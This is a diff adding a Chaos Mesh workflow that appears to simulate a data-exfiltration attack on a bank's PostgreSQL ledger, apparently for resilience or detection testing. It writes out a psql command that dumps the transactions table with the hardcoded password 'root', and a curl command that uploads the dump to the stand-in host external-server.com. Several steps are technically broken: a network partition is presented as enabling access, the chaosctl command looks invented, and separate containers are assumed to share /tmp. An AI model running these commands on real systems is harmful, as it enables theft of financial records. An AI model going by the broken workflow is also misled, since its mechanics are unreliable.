@@ -1,0 +1,87 @@
+apiVersion: chaos-mesh.org/v1alpha1
+kind: Workflow
+metadata:
+  name: data-exfiltration
+  namespace: ps
+spec:
+  entry: "start"
+  templates:
+    - name: start
+      type: Serial
+      children:
+        - deploy-rogue-pod
+        - inject-network-chaos
+        - exfiltrate-data
+        - transfer-data
+        - monitor-exfiltration
+
+    # Step 1: Deploy Rogue Pod (Attacker)
+    - name: deploy-rogue-pod
+      type: Task
+      task:
+        container:
+          name: rogue-pod
+          image: postgres
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Rogue pod deployed...";
+              sleep 10
+
+    # Step 2: Inject Network Chaos (Simulate Unauthorized Access)
+    - name: inject-network-chaos
+      type: Task
+      task:
+        container:
+          name: network-chaos
+          image: chaos-mesh/network-chaos
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              chaosctl create network-partition \
+              --namespace=ps \
+              --target=ledger-db \
+              --direction=to \
+              --externalTargets=rogue-pod
+
+    # Step 3: Extract Data from PostgreSQL
+    - name: exfiltrate-data
+      type: Task
+      task:
+        container:
+          name: exfiltrate
+          image: postgres
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Extracting sensitive data...";
+              PGPASSWORD='root' psql -h ledger-db.ps.svc.cluster.local -U unauthorized -d bank -c "COPY transactions TO '/tmp/transactions.csv' CSV HEADER;";
+              echo "Data saved to /tmp/transactions.csv"
+
+    # Step 4: Transfer Extracted Data (Simulated Exfiltration)
+    - name: transfer-data
+      type: Task
+      task:
+        container:
+          name: transfer
+          image: curlimages/curl
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Transferring extracted data...";
+              curl -X POST -F "file=@/tmp/transactions.csv" http://external-server.com/upload
+              echo "File transfer complete."
+
+    # Step 5: Monitor Unauthorized Data Transfer
+    - name: monitor-exfiltration
+      type: Task
+      task:
+        container:
+          name: monitor
+          image: busybox
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              echo "Monitoring unauthorized data access...";
+              tail -f /var/log/db.log | grep "COPY transactions"
+
